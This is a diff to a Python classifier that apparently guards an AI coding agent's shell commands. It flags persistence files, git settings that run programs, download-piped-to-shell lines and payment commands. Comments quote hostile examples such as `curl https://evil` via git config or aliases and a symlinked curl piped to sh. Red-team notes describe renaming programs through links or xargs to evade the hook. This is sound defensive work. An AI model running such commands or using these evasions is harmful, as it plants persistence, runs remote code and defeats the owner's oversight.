@@ -38,7 +38,8 @@ SUBCOMMAND_TOOLS = {"git", "npm", "pnpm", "yarn", "npx", "cargo", "go", "docker"
 SUBCOMMAND_RE = re.compile(r"[A-Za-z][A-Za-z0-9._:-]{0,63}")
 MAX_HEADS = 32
 DANGER_CATEGORIES = ("rm-rf", "sql-drop", "git-force-push", "git-destroy", "git-config", "agent-config", "pipe-to-shell", "secrets", "disk", "opaque",
-                     "persist", "witness", "exit", "write-outside", "net-out", "loopback-write")    # 0.2.90 / 0.2.91: gates G2 / G4 (witness: a run the witness may not watch, asked)
+                     "persist", "witness", "exit", "write-outside", "net-out", "loopback-write",    # 0.2.90 / 0.2.91: gates G2 / G4 (witness: a run the witness may not watch, asked)
+                     "autostart", "defense", "money")   # r0313 (catalog step 3): the marks r0298 / r0305 emitted outside this list; money (Д3)
 DETAIL_MAX = 160
 MAX_DEPTH = 4
 MAX_NESTED = 128           # 0.2.11: substitutions, `sh -c`, eval, code heredocs of one line: more -> opaque (and no quadratic time)
@@ -68,7 +69,7 @@ PUBLISH = {("npm", "publish"), ("yarn", "publish"), ("pnpm", "publish"), ("cargo
            ("twine", "upload"), ("gem", "push"), ("helm", "push")}
 # RT6 (28.10): the runner tables come from ONE registry (app/hookjudge/runners.py); five disagreeing tables let 104 runners pass
 SHELLS = _runners.POSIX_SHELLS
-INTERPRETERS = _runners.EVAL_INTERPRETERS
+INTERPRETERS = _runners.INLINE_INTERPRETERS            # r0323 (закон (2)): one list, runners.py
 FETCHERS = {"curl", "wget", "fetch", "http", "https", "iwr", "aria2c", "xh", "httpie"}
 # RT-0.2.54: readers that print FILE CONTENT while walking a directory tree. Rooted outside the project they reach into .ssh / .aws / *.pem
 # WITHOUT naming them (the per-operand secret check only fires on a secret-named operand), so the owner is never asked and the secret read
@@ -126,7 +127,7 @@ GIT_BRANCH_LIST = {"-l", "--list", "-a", "--all", "-r", "--remotes", "--contains
                    "--show-current", "-v", "-vv", "--verbose", "--sort", "--format", "--color", "--no-color", "--column", "--no-column",
                    "--abbrev", "--no-abbrev", "-i", "--ignore-case", "--omit-empty"}
 # git configuration keys whose value is a program or code git runs later (`git config core.fsmonitor ./x` then `git status` runs ./x)
-GIT_EXEC_KEY = re.compile(r"(core\.(fsmonitor|pager|editor|sshcommand|hookspath|gitproxy|askpass|alternaterefscommand)|diff\.external|"
+GIT_EXEC_KEY = re.compile(r"(core\.(fsmonitor|pager|editor|sshcommand|hookspath|gitproxy|askpass|alternaterefscommand)|diff\.external|init\.templatedir|"
                           r"(diff|merge|filter)\..+|alias\..+|credential\..*|sequence\.editor|gpg\..*program|pager\..+|"
                           r"include\.path|includeif\..+|uploadpack\..+|receivepack\..+|remote\..+\.(uploadpack|receivepack|proxy)|"
                           r"protocol\..+|url\..+|http\..*(proxy|curloptresolve)|instaweb\..+|web\.browser|browser\..+|man\..+)", re.I)
@@ -181,11 +182,8 @@ def _runner_opt(name, o, opts):
 
 # 0.2.11 (R6-03): interpreters and runners given code on the command line (`node -e`, `tsx -e`, `python -c`, `ruby -e` ...): "<id> [eval]".
 # Whatever an owner listed for `node build.js` / `python x.py` then does not cover code written into the line itself.
-EVAL_OPTS = {"node": {"-e", "--eval", "-p", "--print", "-r", "--require", "--import", "--loader", "--experimental-loader"},
-             "python": {"-c"}, "ruby": {"-e", "-r"}, "perl": {"-e", "-E", "-M", "-m"}, "php": {"-r", "-B", "-R", "-E", "-F"},
-             "lua": {"-e", "-l"}, "Rscript": {"-e"}, "osascript": {"-e"}, "julia": {"-e", "-E"}, "deno": {"eval"}, "bun": {"-e", "--eval", "-p", "--print"}}
-for _n in ("nodejs", "tsx", "ts-node", "ts-node-dev", "esno", "tsm", "swc-node", "babel-node", "vite-node", "nodemon"):
-    EVAL_OPTS[_n] = EVAL_OPTS["node"]
+# r0323: the table lives in runners.INLINE_CODE_OPTS (one list of inline-code interpreters; swift / luajit added there)
+EVAL_OPTS = {k: set(v) for k, v in _runners.INLINE_CODE_OPTS.items()}
 
 
 def is_git_exec_path(p: str) -> bool:
@@ -223,16 +221,34 @@ SECRET_ENV = re.compile(r"\$\{?(\w*(SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE
 # mandate's `unlisted` says. Agent config elsewhere in ~/.claude (memory, tools, projects) stays `agent-config` (asked, approvable).
 PERSIST_PATH = re.compile(r"(^|/)(\.(zshrc|zprofile|zshenv|zlogin|zlogout|bashrc|bash_profile|bash_login|bash_logout|profile|login|cshrc|tcshrc|kshrc|mkshrc|"
                           r"xinitrc|xprofile|xsession|pam_environment|hushlogin)|\.config/fish/[^/]+\.fish|\.config/fish/conf\.d/.*|"
+                          # r0319 (RT 15.11 П3): zsh loads the compiled .zwc in place of the start file; fish runs functions/*.fish
+                          # (fish_prompt at every prompt); emacs / tmux / screen run their start-up files at every start
+                          r"\.(zshrc|zprofile|zshenv|zlogin|zlogout)\.zwc|\.config/fish/(functions|completions)/.+|"
+                          r"\.emacs(\.el)?|\.emacs\.d/(init|early-init|default)\.el|\.config/emacs/(init|early-init)\.el|"
+                          r"\.screenrc|\.config/plasma-workspace/(env|shutdown)(/.*)?|\.kde4?/Autostart(/.*)?|"
                           r"Library/LaunchAgents(/.*)?|Library/LaunchDaemons(/.*)?|Library/StartupItems(/.*)?|\.config/autostart/.*|\.config/systemd/user/.*|"
                           r"\.claude/settings(\.local)?\.json|\.claude/hooks(/.*)?|\.claude/plugins(/.*)?|\.claude\.json|\.mcp\.json|"
                           r"\.config/deus-witness(/.*)?|\.deus-witness(/.*)?|Library/Application Support/deus-witness(/.*)?|\.local/share/deus-witness(/.*)?|deus-witness/shadow(/.*)?|"
                           r"\.ssh/(authorized_keys2?|config|rc|environment)|\.config/git/hooks(/.*)?|\.gitconfig|\.config/git/config|"
                           r"(site|dist)-packages/[^/]+\.pth|(site|dist)-packages/(sitecustomize|usercustomize)\.py|"     # r0305: every python runs them at start (T1546.018)
                           r"lib/python[0-9.]*/(sitecustomize|usercustomize)\.py|"
-                          r"\.ipython/profile_[^/]+/(startup/[^/]+|ipython_(kernel_)?config\.py))$|"     # r0305: IPython runs them at start
+                          r"\.ipython/profile_[^/]+/(startup/[^/]+|ipython_(kernel_)?config\.py)|"     # r0305: IPython runs them at start
+                          # r0313 (Д2, T1546): the editor and the shell framework run these at start: vim / neovim start-up files and the
+                          # folders they load by themselves; oh-my-zsh's own code and custom folder (sourced by every new zsh)
+                          r"\.(vimrc|gvimrc|exrc)|\.vim/(vimrc|gvimrc|plugin/.+|after/.+|ftplugin/.+|pack/[^/]+/start/.+)|"
+                          r"\.config/nvim/(init\.(lua|vim)|plugin/.+|after/.+|ftplugin/.+|lua/.+)|"
+                          r"\.oh-my-zsh/(oh-my-zsh\.sh|custom/.+|lib/.+|plugins/.+|themes/.+))$|"
                           r"^/(private/)?etc/(cron\.[^/]+/.*|crontab|cron\.d/.*|profile(\.d/.*)?|bashrc|zshrc|zprofile|zshenv|sudoers(\.d/.*)?|hosts|paths(\.d/.*)?|"
-                          r"launchd\.conf|rc\.[^/]+|environment|ld\.so\.[^/]+|pam\.d/.*)$|^/(private/)?var/(at|cron|spool/cron)/.*|"
-                          r"^/Library/(LaunchAgents|LaunchDaemons|StartupItems)/.*", re.I)
+                          r"launchd\.conf|rc\.[^/]+|environment|ld\.so\.[^/]+|pam\.d/.*|"
+                          # r0319 (RT 15.11 П3): Debian / Ubuntu system rc files, periodic jobs (named in KONSTITUCIYA-KATALOG Д2 itself),
+                          # the desktop autostart, the login banner scripts, systemd units and their .wants links, apt hooks, init scripts
+                          r"bash\.bashrc|zsh/(zshrc|zshenv|zprofile|zlogin|zlogout)|periodic(/.*)?|xdg/autostart(/.*)?|update-motd\.d(/.*)?|"
+                          r"systemd/(system|user)(/.*)?|apt/apt\.conf\.d(/.*)?|init\.d(/.*)?|init/[^/]+\.conf)$|^/(private/)?var/(at|cron|spool/cron)/.*|"
+                          r"^/Library/(LaunchAgents|LaunchDaemons|StartupItems)/.*|"
+                          # 15.11 (r0321): tmux reads its start-up file from the HOME folder only. A project's own `.tmux.conf` starts
+                          # nothing by itself: it is a config that is code for `tmux -f` (execguard EXEC_NAMES, test_rt7_rules: the change
+                          # is asked as ESCALATE_EXEC_CHANGED), not a refusal. So the name is persist only in a home-shaped folder.
+                          r"^(~|\$\{?HOME\}?|(/private)?/var/root|/root|/Users/[^/]+|/home/[^/]+)/(\.tmux\.conf|\.config/tmux/tmux\.conf)$", re.I)
 
 
 def is_persist_path(p: str) -> bool:
@@ -269,7 +285,10 @@ def is_later_run_path(p) -> bool:
 
 def is_autostart_tail(t) -> bool:
     """r0298: a relative path whose tail is a place that starts programs by itself, wherever the unknown directory is."""
-    return isinstance(t, str) and bool(t) and (is_persist_path(t) or bool(AUTOSTART_GIT.search(t)))
+    return isinstance(t, str) and bool(t) and (is_persist_path(t) or bool(AUTOSTART_GIT.search(t)) or bool(_HOME_TAIL.match(t)))
+
+
+_HOME_TAIL = re.compile(r"^(\./)?(\.tmux\.conf|\.config/tmux/tmux\.conf)$")   # r0321: the unknown directory may be the home folder
 
 
 # 0.2.90: variables and aliases a line sets ONCE with a literal value (`D=/x; cat $D/f`, `alias ll='ls -la'; ll`) are read as bash would
@@ -1022,6 +1041,11 @@ class Command:
                 while k < len(self.danger) and self.danger[k].startswith(AUTOSTART + ":"):
                     k += 1
                 self.danger.insert(k, d)
+            elif cat == MONEY:                      # r0319 (RT 15.11 П1): money is named first (after autostart): the question's
+                k = 0                               # first line says the worst thing the line does, not "a command it cannot check"
+                while k < len(self.danger) and self.danger[k].startswith((AUTOSTART + ":", MONEY + ":")):
+                    k += 1
+                self.danger.insert(k, d)
             else:
                 self.danger.append(d)
         o = self.code_d if _CODE[0] > 0 else self.plain_d
@@ -1060,6 +1084,80 @@ class Command:
         o = self.code_h if _CODE[0] > 0 else self.plain_h
         if h not in o:
             o.append(h)
+
+
+_SCRIPT_EXT = re.compile(r"\.(?:[cm]?js|ts|py|rb|pl|php|sh|lua|jar)$", re.I)
+
+
+# r0323 (закон (3), RT 15.11 Б4): programs whose immutable article depends on the arguments (Н8 git push -f, Н10 xattr / spctl / csrutil
+# / tccutil / log erase); fed by xargs from input the line does not show, the arguments are not known -> asked (opaque), never silent.
+# git with a sub-command that cannot push, rewrite or reconfigure (`xargs git add`, `xargs git blame`) stays what it was.
+XARGS_ARG_ARTICLES = {"git", "xattr", "spctl", "csrutil", "tccutil", "log"}
+GIT_XARGS_SAFE = {"add", "rm", "mv", "blame", "log", "show", "diff", "ls-files", "grep", "status", "checkout-index", "hash-object",
+                  "cat-file", "rev-parse", "annotate", "restore", "stage", "commit", "notes", "describe", "shortlog"}
+
+
+def _xargs_tail(argv, name, args, fed, cwd, home, project, depth, c):
+    """r0323 (закон (3)): xargs runs `PROGRAM ARGS INPUT...`. Input the line shows (`echo 'push -f origin main' | xargs git`) is judged
+    as that one command line (xargs splits on blanks and honours quotes, as shlex); input it does not show leaves the arguments of an
+    article-bearing program unknown -> opaque."""
+    if isinstance(fed, str) and fed.strip():
+        try:
+            words = shlex.split(fed)
+        except ValueError:
+            words = None
+        if words is not None and len(words) <= 64:
+            _merge(c, classify(" ".join(shlex.quote(w) for w in [argv[0]] + list(args) + words), cwd, home, depth + 1, project, _budget=c.budget))
+            return
+    if name in XARGS_ARG_ARTICLES:
+        ops = [a for a in args if not a.startswith("-")]
+        if name == "git" and ops and ops[0] in GIT_XARGS_SAFE:
+            return
+        c.add("opaque", "%s through xargs: its arguments come from input the line does not show" % name)
+
+
+def _prog_kind(n):
+    """`python3.12` and `python` are one program; `git` and `g` are not."""
+    return re.sub(r"[\d.\-]+$", "", n.lower())
+
+
+def _program_by_path(a0, name, cwd, home, project, fr):
+    """r0319 (RT 15.11 Б1). Law: a program run by a PATH has the name of the program that path IS, not of the word typed. `ln -s
+    /usr/bin/git ./g && ./g push -f` is git (Н8), `./xa -d com.apple.quarantine` after `ln -s /usr/bin/xattr ./xa` is xattr (Н10). The
+    link may be made on this line (the frame's links, `cp` / `install` copies) or earlier (the hook's realpath of the path, asked like
+    every other path). A target inside the project keeps the typed name (node_modules/.bin/jest -> jest.js is still the project's
+    jest); so does a target that is the same program under a version suffix (.venv/bin/python -> python3.12)."""
+    try:
+        e = _expand(a0, cwd, home)
+        if e is None:
+            return name
+        ap = os.path.normpath(e if os.path.isabs(e) else os.path.join(cwd, e))
+        if fr is not None and ap in (fr.get("progs") or {}):
+            tn = fr["progs"][ap]
+        else:
+            tgt = _abspath(e, cwd, home)
+            if isinstance(tgt, str) and os.path.normpath(tgt) == ap:
+                # r0323 (закон (1)): a hard link has no target -- realpath is the file itself (`ln .../bitcoin-cli ./bc`). Its other name,
+                # when the fs facade can find one (LocalFS: the project walk), is the program; else the path stays "the agent's program"
+                # (actions.unlisted_allow_gate: never silent under unlisted: allow)
+                hl = _fs.current().hardlink_name(ap)
+                tgt = hl if isinstance(hl, str) and hl != ap else None
+            if not isinstance(tgt, str) or os.path.normpath(tgt) == ap:
+                return name
+            tgt = os.path.normpath(tgt)
+            tn = os.path.basename(tgt)
+            if isinstance(project, str) and (tgt == project or tgt.startswith(project.rstrip("/") + "/")) and \
+                    (_SCRIPT_EXT.search(tn) or _prog_kind(tn) == _prog_kind(name)):
+                return name           # node_modules/.bin/jest -> ../jest/bin/jest.js is the project's jest (r0323: `./bc` -> ./vendor/bitcoin-cli is not)
+        if not tn or tn == name or not re.fullmatch(r"[\w.+-]{1,64}", tn):
+            return name
+        if _prog_kind(tn) == _prog_kind(name) and name.lower() == _prog_kind(name):
+            return name               # python -> python3.12: the typed name is the program itself (r0323: `./git2` -> git is git, RT 15.11 Б1-а)
+        if fr is not None:
+            fr.setdefault("renamed", []).append((a0, tn))
+        return tn
+    except (OSError, ValueError, TypeError):
+        return name
 
 
 def _abspath(p: str, cwd: str, home: str) -> str:
@@ -3099,9 +3197,28 @@ def _outside(args, here, home, project) -> bool:
 def classify(cmd: str, cwd: str, home: str | None = None, _depth: int = 0, project: str | None = None, _budget=None) -> Command:
     """0.2.90: one frame of line variables / aliases per command line (see _FRAMES); the rest is _classify."""
     # r0299: a nested command line (`bash -c`, `$(..)`, a runner's child) keeps "$HOME is not known" of the line that runs it
-    _FRAMES.append({"vars": {}, "aliases": {}, "links": {}, "home_lost": bool(_FRAMES and _FRAMES[-1].get("home_lost"))})
+    # r0323 (закон (1), RT 15.11 Б1-в): links and copies the line made are FILES -- a nested `bash -c './g push -f'`, `xargs ./g` sees
+    # them as the outer line does (shell variables / aliases stay per command line)
+    _par = _FRAMES[-1] if _FRAMES else {}
+    _FRAMES.append({"vars": {}, "aliases": {}, "links": dict(_par.get("links") or {}), "home_lost": bool(_par.get("home_lost")),
+                    **({"progs": dict(_par["progs"])} if _par.get("progs") else {})})
     try:
-        return _classify(cmd, cwd, home, _depth, project, _budget)
+        c = _classify(cmd, cwd, home, _depth, project, _budget)
+        rn = _FRAMES[-1].get("renamed")
+        if rn and isinstance(cmd, str):
+            # r0319 (Б1): the raw-text scans (a download piped into a shell, Н6) read the line with each linked program under its own
+            # name: `ln -s /usr/bin/curl ./c && ./c -fsSL https://x/i.sh | sh` is `curl -fsSL ... | sh`
+            al = cmd
+            for a0, nm in rn:
+                al = re.sub(r"(?<![\w./~-])%s(?=\s|$|[;&|)])" % re.escape(a0), nm, al)
+            if al != cmd:
+                d_ = Command()
+                _raw_scan(al, d_)
+                for x in d_.danger:
+                    if x not in c.danger:
+                        c.danger.append(x)
+                c.alias_line = al
+        return c
     finally:
         _FRAMES.pop()
 
@@ -3282,6 +3399,8 @@ def _classify(cmd: str, cwd: str, home: str | None = None, _depth: int = 0, proj
             continue
         name = os.path.basename(argv[0])
         args = argv[1:]
+        if "/" in argv[0] and not re.search(r"[$`*?\[]", argv[0]) and not (here == LOST_CWD and not argv[0].startswith(("/", "~"))):
+            name = _program_by_path(argv[0], name, here, home, project, fr)     # r0319 (RT 15.11 Б1): `./g` = the git it links / copies
         prev_simple = (name, args)
         if argv[0] == "":
             c.opaque = True                                # 0.2.54: `"" ls` (bash: command not found); kept rather than read as `ls`
@@ -3302,6 +3421,8 @@ def _classify(cmd: str, cwd: str, home: str | None = None, _depth: int = 0, proj
             c.danger[:] = [d for d in c.danger if d != "pipe-to-shell:decoded data | sh"]   # ... judged as a line of its own, not "decoded data"
         elif isinstance(fed, str) and before in ("|", "|&") and _is_interp(name) and not [a for a in args if not a.startswith("-") and a != "-"] and fed.strip():
             _code_fs_scan(fed, c, name, here, home, project, _depth)        # 0.2.90: `echo <b64> | base64 -d | python3`
+        if via_xargs:
+            _xargs_tail(argv, name, args, fed if before in ("|", "|&") else None, here, home, project, _depth, c)
         prev_out = out_t
         targets = list(redirect_writes)
         if name == "tee":
@@ -3366,6 +3487,15 @@ def _classify(cmd: str, cwd: str, home: str | None = None, _depth: int = 0, proj
                     # r0300: kept aside until `ln` itself is judged: `ln -s /tmp/evil ~/.bashrc` writes ~/.bashrc (the link), not
                     # /tmp/evil (before r0300 the link was followed by its own command: "write /tmp/evil", no persist, a question)
                     new_link = (os.path.normpath(_abspath(e_l, here, home)), os.path.normpath(_abspath(tgt, here, home)))
+        if name in ("cp", "install", "ditto") and fr is not None:
+            ops_ = [a for a in args if not a.startswith("-")]
+            if len(ops_) == 2 and all(_lit_ok(o) for o in ops_):      # r0319 (Б1): `cp /usr/bin/git ./g`: ./g IS git for the rest of the line
+                e_s, e_d = _expand(ops_[0], here, home), _expand(ops_[1], here, home)
+                if e_s is not None and e_d is not None:
+                    d_ = os.path.normpath(_abspath(e_d, here, home))
+                    if e_d.endswith("/") or _fs.current().isdir(d_):
+                        d_ = os.path.join(d_, os.path.basename(e_s.rstrip("/")))
+                    fr.setdefault("progs", {})[d_] = os.path.basename(e_s.rstrip("/"))
         if name in EVALISH or (name in ("mapfile", "readarray") and any(a.startswith("-") and "C" in a for a in args)):
             c.opaque = True                                # 0.2.12 (R7-02): what the rest of the line means (its directory, its commands)
             c.add("opaque", "%s: the rest of the line cannot be judged" % name)     # is not known after eval / source / alias / trap ...
@@ -4788,6 +4918,8 @@ def _one(name, args, cwd, home, c, via_xargs, depth, project=None, lw_plain=Fals
     if name in TX_AWK:
         for a in sorted(nonfile):
             _code_scan(a, c, name, obfuscation=False)     # rt2810: `awk 'BEGIN{system("curl https://h")}'` shows its host
+            if "system" in a:
+                _code_runs(a, c, name, cwd, home, project, depth)    # r0323 (закон (2)): what `system(...)` runs is a command line
     if _eval_form(name, args):
         _sa = " ".join(args[1:] if name == "deno" else args)
         if PY_MODULE.fullmatch(name):                     # r0261c (а): the code of `python3 -c` seen as text where it only writes text
@@ -4799,6 +4931,7 @@ def _one(name, args, cwd, home, c, via_xargs, depth, project=None, lw_plain=Fals
         _code_fs_scan(_eval_code(name, args), c, name, cwd, home, project, depth, operands=[o for o in ops if _lit_ok(o)])   # 0.2.90
     _gates(name, args, ops, short, long_, cwd, home, c)                                  # 0.2.90: G2 egress, G3 keychain, G4 persistence
     _defense(name, args, ops, short, long_, c)                                           # r0305: an OS protection switched off (Н10)
+    _money(name, ops, c, args, via_xargs)                                                # r0313 (Д3): a payment through a shell CLI
     if name == "git":
         _git_global(args, cwd, home, c, depth, project)  # s7 (O1): `git -c alias.x='!curl https://evil' x`
         _git_config_set(args, cwd, home, c, depth, project)     # rt2810: `git config core.sshCommand "curl https://evil"`
@@ -5363,6 +5496,15 @@ def _git(args, cwd, home, c):
             if k + 1 < len(rest):
                 _write_target(rest[k + 1], cwd, home, c, c.writes)
     if sub == "config":                                  # 0.2.9: sets a program git runs later (core.fsmonitor, diff.*.textconv, alias.*, ...)
+        # r0319 (RT 15.11 П4): `git config -f ~/.gitconfig core.hooksPath h` -- the value of -f / --file / --blob ... is no key
+        ops, j_ = [], 0
+        while j_ < len(rest):
+            if rest[j_] in ("-f", "--file", "--blob", "--type", "--default", "--comment", "--value", "--fixed-value") and j_ + 1 < len(rest):
+                j_ += 2
+                continue
+            if not rest[j_].startswith("-"):
+                ops.append(rest[j_])
+            j_ += 1
         key = ops[1] if ops[:1] == ["set"] and len(ops) > 1 else (ops[0] if ops else "")
         reading = short & {"l"} or long_ & {"--list", "--get", "--get-all", "--get-regexp", "--get-urlmatch", "--show-origin", "--show-scope",
                                              "--unset", "--unset-all"} or ops[:1] in (["get"], ["list"], ["unset"])
@@ -5370,6 +5512,11 @@ def _git(args, cwd, home, c):
             c.add("git-config", "config --edit")
         elif not reading and GIT_EXEC_KEY.fullmatch(key):
             c.add("git-config", "config " + key)
+    if sub in ("init", "clone") and any(a == "--template" or a.startswith("--template=") for a in rest):
+        # r0319 (RT 15.11 П4): git copies the template's hooks/ into the new repository's .git/hooks (git-init(1) TEMPLATE DIRECTORY)
+        t_ = next((a.split("=", 1)[1] if "=" in a else (rest[k + 1] if k + 1 < len(rest) else "") for k, a in enumerate(rest)
+                   if a == "--template" or a.startswith("--template=")), "")
+        c.add("git-config", "%s --template=%s" % (sub, t_[:120]))
     if sub in ("push", "pull", "fetch", "clone", "ls-remote") or (sub == "remote" and ops[:1] == ["update"]) or (sub == "submodule" and ops[:1] == ["update"]):
         c.add("net-out", "git %s %s" % (sub, " ".join(ops)[:80]))
     elif sub == "archive" and any(a.startswith("--remote") or a.startswith("--exec") for a in rest):
@@ -5787,6 +5934,123 @@ def _defense(name, args, ops, short, long_, c):
         c.add(DEFENSE, det)
 
 
+# r0313 (KONSTITUCIYA-KATALOG-1411 Д3, class M2): money spent through a shell CLI. The programs are strict_policy's (they already carry the
+# danger `exit` in the default mode, mapping.standing_exit: asked as "a program that reaches the internet"); the mark `money` says what the
+# line does -- the vocabulary's own ESCALATE_MONEY sentence ("Your agent wants to pay ..."), Critical. A question, never a refusal; only a
+# verb that sends value (stripe ... create / confirm / capture / pay on a payment resource, cast send, solana transfer ...). A read
+# (`stripe charges list`, `cast call`, `solana balance`) or an unknown verb stays the `exit` question it was: no new question anywhere.
+MONEY = "money"
+MONEY_VERBS = {
+    "stripe": {"create", "confirm", "capture", "pay"},
+    "paypal": {"pay", "send", "payout", "payouts", "capture", "authorize"},
+    "bitcoin-cli": {"sendtoaddress", "sendmany", "sendrawtransaction", "send", "sendall", "bumpfee"},
+    "elements-cli": {"sendtoaddress", "sendmany", "sendrawtransaction", "send", "sendall", "bumpfee"},
+    "lightning-cli": {"pay", "xpay", "keysend", "withdraw", "sendpay", "fundchannel", "multifundchannel"},
+    "lncli": {"payinvoice", "sendpayment", "sendcoins", "sendmany", "sendtoroute", "openchannel"},
+    "solana": {"transfer", "pay", "withdraw-stake", "withdraw-from-vote-account"},
+    "spl-token": {"transfer", "burn"},
+    "cast": {"send", "publish"},
+    "near": {"send", "send-near", "send-ft", "send-nft", "transfer"},
+    "aptos": {"transfer"},
+    "sui": {"transfer", "transfer-sui", "pay", "pay-sui", "pay-all-sui"},
+    # r0319 (RT 15.11 Б4): wallets outside the first list -- each verb sends value
+    "seth": {"send", "publish"},
+    "electrum": {"payto", "paytomany", "broadcast"},
+    "monero-wallet-cli": {"transfer", "transfer_split", "sweep_all", "sweep_single", "sweep_below", "donate"},
+    "cardano-cli": {"submit"},
+    "litecoin-cli": {"sendtoaddress", "sendmany", "sendrawtransaction", "send", "sendall"},
+    "dogecoin-cli": {"sendtoaddress", "sendmany", "sendrawtransaction", "send", "sendall"},
+}
+STRIPE_MONEY = {"charges", "payment_intents", "payouts", "transfers", "refunds", "invoices", "subscriptions", "topups",
+                "subscription_schedules", "application_fees", "payment_links"}      # r0319: a payment link takes the customer's money
+STRIPE_POST = re.compile(r"^/?v1/(charges|payment_intents|payouts|transfers|refunds|invoices/[^/]+/pay|subscriptions|topups|payment_links|"
+                         r"checkout/sessions)(/|$|\?)")
+# r0323 (RT 15.11 П1): payment APIs by host (any case, optional scheme for httpie / xh, any port) -> the paths that move money
+PAY_URL = re.compile(r"(?i)^(?:https?://)?(?:[^/@\s]*@)?(?P<host>api\.stripe\.com|api(?:-m)?(?:\.sandbox)?\.paypal\.com|"
+                     r"connect\.squareup(?:sandbox)?\.com|[\w.-]*\.adyen(?:payments)?\.com|api\.coinbase\.com)\.?(?::\d+)?(?P<path>/[^?#\s]*)?")
+PAY_PATH = {"stripe": re.compile(r"^/" + STRIPE_POST.pattern[3:]),
+            "paypal": re.compile(r"(?i)^/v[12]/(payments/(payment|payouts|authorizations/[^/]+/capture|captures/[^/]+/refund)|checkout/orders(/[^/]+/(capture|authorize))?)(/|$)"),
+            "squareup": re.compile(r"(?i)^/v2/(payments|refunds|orders/[^/]+/pay)(/|$)"),
+            "squareupsandbox": re.compile(r"(?i)^/v2/(payments|refunds|orders/[^/]+/pay)(/|$)"),
+            "adyen": re.compile(r"(?i)^/(checkout/)?v\d+/(payments|payouts|transfers|captures|refunds)|/pal/servlet/Payment/v\d+/(authorise|capture|refund)", re.I),
+            "adyenpayments": re.compile(r"(?i)^/(checkout/)?v\d+/(payments|payouts|transfers)"),
+            "coinbase": re.compile(r"(?i)^/(v2/accounts/[^/]+/transactions|api/v3/brokerage/orders)(/|$)")}
+
+
+# r0319 (RT 15.11 П2/Б4): a package runner starts the named package's program with the rest of the line (`npx stripe charges create`)
+PKG_RUNNERS = {"npx", "bunx", "pnpx"}
+PKG_PROGRAM = {"@stripe/cli": "stripe", "@solana/cli": "solana"}
+MONEY_READ = {"list", "retrieve", "get", "balance", "call", "logs", "listen", "trigger", "help", "--help", "-h", "version", "config"}
+
+
+def _money_of(name, ops, args=(), via_xargs=False):
+    """r0313: -> the detail ("stripe charges create") of a payment by this one program, or None.
+    r0319 (RT 15.11 П2): the verb is looked for among ALL the operands (the value of an option -- `--api-key sk_x`, `-p prod`, `--url
+    mainnet-beta` -- is an operand to the generic parser and shifted the old ops[:3]); `stripe post` with the full URL or a query; a
+    package runner (npx / bunx / pnpm dlx); a money program fed by xargs (its verb comes from the input the line does not show)."""
+    w = [o.lower() for o in ops[:24] if isinstance(o, str)]
+    if name in PKG_RUNNERS or (name in ("pnpm", "yarn", "bun") and w[:1] in (["dlx"], ["x"])):
+        rest = list(ops[1:] if name not in PKG_RUNNERS else ops)
+        if not rest:
+            return None
+        pkg = str(rest[0])
+        pkg = PKG_PROGRAM.get(re.sub(r"(?<=.)@[^@/]*$", "", pkg), re.sub(r"(?<=.)@[^@/]*$", "", pkg).rsplit("/", 1)[-1])
+        det = _money_of(pkg, rest[1:])
+        return ("%s %s" % (name, det))[:120] if det else None
+    if name in ("curl", "wget", "http", "https", "xh", "xhs") and args:
+        # r0319 (RT 15.11 Б1 q1.3): a POST to the payment API itself is the payment (`curl -X POST https://api.stripe.com/v1/charges -d ...`)
+        # r0323 (RT 15.11 П1): the URL as the program reads it -- any case, `//v1`, `:443`, no scheme for httpie / xh -- and every way to
+        # POST (`--json`, `-XPOST`, `--method=POST`, `--body-data`); PayPal / Square / Adyen / Coinbase payment endpoints too.
+        # The detail is the URL AS TYPED (a quote of the call: qwords shows it whole, "Your agent wants to pay https://api.stripe.com/..")
+        al = [str(a) for a in args]
+        hit = None
+        for a in al:
+            m_ = PAY_URL.match(a) if (re.match(r"(?i)https?://", a) or name not in ("curl", "wget")) else None
+            if m_:
+                path = "/" + re.sub(r"/{2,}", "/", m_.group("path") or "").lstrip("/")
+                if PAY_PATH[m_.group("host").lower().split(".")[-2]].match(path):
+                    hit = a
+                    break
+        up = [a.upper() for a in al]
+        post = any(a in ("-d", "-F", "--form", "--post-data", "--post-file", "--json", "--body-data", "--body-file", "POST") or
+                   a.startswith(("--data", "-d", "--form=", "--post-", "--json=", "--body-data=", "--body-file=")) for a in al) or \
+            any(up[k] in ("-X", "--REQUEST", "--METHOD") and k + 1 < len(up) and up[k + 1] == "POST" for k in range(len(up))) or \
+            any(re.fullmatch(r"(?:-X|--REQUEST=|--METHOD=)POST", u) for u in up) or \
+            (name not in ("curl", "wget") and any("=" in a and not a.startswith("-") for a in al))
+        if hit is not None and post:
+            return hit[:120]
+        return None
+    if name == "forge" and w[:1] == ["script"] and any(str(a) == "--broadcast" for a in args):
+        return "forge script --broadcast " + " ".join(str(o) for o in ops[1:2])[:80]
+    verbs = MONEY_VERBS.get(name)
+    if not verbs:
+        return None
+    if via_xargs and not set(w) & MONEY_READ:
+        return "%s through xargs: its arguments come from input the line does not show" % name
+    if name == "stripe":
+        for i, v in enumerate(w[:-1]):
+            if v == "post":
+                u = re.sub(r"^https?://api\.stripe\.com(?=/)", "", w[i + 1])
+                if STRIPE_POST.match(u):
+                    return "stripe post " + ops[i + 1][:80]
+        for i in range(len(w) - 1):
+            if w[i] in STRIPE_MONEY and w[i + 1] in verbs:
+                return "stripe %s %s" % (ops[i], ops[i + 1])
+            if w[i] == "checkout" and i + 2 < len(w) and w[i + 1] == "sessions" and w[i + 2] in verbs:
+                return "stripe checkout sessions " + ops[i + 2]
+        return None
+    for i, v in enumerate(w):
+        if v in verbs:
+            return " ".join([name] + list(ops[:i + 1]))[:120]
+    return None
+
+
+def _money(name, ops, c, args=(), via_xargs=False):
+    det = _money_of(name, ops, args, via_xargs)
+    if det is not None:
+        c.add(MONEY, det)
+
+
 def _gates(name, args, ops, short, long_, cwd, home, c):
     """G2 (egress) / G3 (secrets) / G4 (persistence) for the commands the 0.2.88 classifier let through under `unlisted: allow`
     (spec v0.1 6.5: `pip install`, `security find-generic-password`, `crontab -`, `launchctl load`, `claude plugin disable`)."""
@@ -5927,7 +6191,8 @@ _FS_API = re.compile(r"(?P<fn>shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|os\
                      r"(?<![\w.])open|io\.open|codecs\.open|File\.open|File\.write|File\.read|IO\.read|IO\.write|File\.binread|File\.binwrite|(?<![\w.])Path)\s*\(")
